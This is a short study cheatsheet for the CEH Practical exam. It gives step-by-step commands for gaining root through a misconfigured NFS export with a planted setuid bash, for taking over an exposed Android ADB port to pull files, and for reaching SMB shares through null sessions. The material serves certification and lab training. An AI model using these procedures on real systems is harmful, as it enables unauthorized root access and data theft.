# CEH_PRACTICAL
This my cheatsheet that i used to study for CEH_PRACTICAL
Tools
1.	Nmap/Zenmap
2.	Wireshark
3.	Metasploit
4.	Hydra
5.	Cryptool / BCTextEncoder
6.	Veracrypt
7.	Burp suite
8.	Hydra
9.	Hashes.com/HashMyfiles/HashCalc
10.	Snow steganography/OpenStego/Covert TCP
11.	SQL Injection / nslookup/sqlmap/nikto
12.	Android Debugging Bridge (adb)
# PRACTICAL TIME
https://github.com/dhabaleshwar/CEHPractical/blob/main/Everything%20You%20Need.md
https://github.com/CyberHackPr/CEH_PRACTICAL/pulls Click Here for Notes


**Priviledge Escalation**
Exploiting misconfigured NFS (port 2049)
•	nmap -sV —p 2049 IP/Subnet
•	sudo apt-get install nfs-common
•	nmap -sV —script=nfs-showmount <Target_IP>
•	check available mounts: showmount -e <Target_IP> -> we will see /home directory
•	mkdir /tmp/nfs
•	sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
•	cd /tmp/nfs
•	sudo cp /bin/bash .
•	sudo chmod +s bash -> it will be highlighted in red
•	ls -la
•	sudo df -h
•	sudo chmod +s bash
after them, In another terminal:
•	Access to target using SSH
•	./bash -p and we're root!
•	cd /home
•	ls -la
•	Find the flag: find / -name "*.txt" -ls 2> /dev/null

**ADB Android Hacking** 
Perform deep scan on the elf files and obtain the last 4 digits of SHA 384 hash of the file with highest entropy value locate into android folder
•	Scan adb port: nmap ip -sV -p 5555
•	Connect adb: adb connect IP:5555
•	Access mobile device: adb shell
•	Elevate privilege using: sudo -i (if it is possile)
•	pwd --> ls --> cd sdcard/Notifications/Scan --> ls --> cat secret.txt (If you can't find, check in others folders)
•	Download files: adb pull /sdcard/Notifications/Scan Do it in another shell, without adb connection!
•	We've three elf files, now we need to calcolate entropy for each of them using this command: ent file.elf
•	After selecting file.elf with highest entropy, we need to calculate hash of SHA 384: sha384sum file.elf and consider only the last 4 digits of the hash result.

SMB Connection
.smbclient -L <TARGET_IP> -N
.smbclient -L <TARGET_IP> -U <USER>
.smbclient //<TARGET_IP>/<USER> -U <USER>
.smbclient //<TARGET_IP>/admin -U admin
.smbclient //<TARGET_IP>/public -N #NULL Session
## SMBCLIENT
.smbclient //<TARGET_IP>/share_name
.help
.ls
.get <filename>


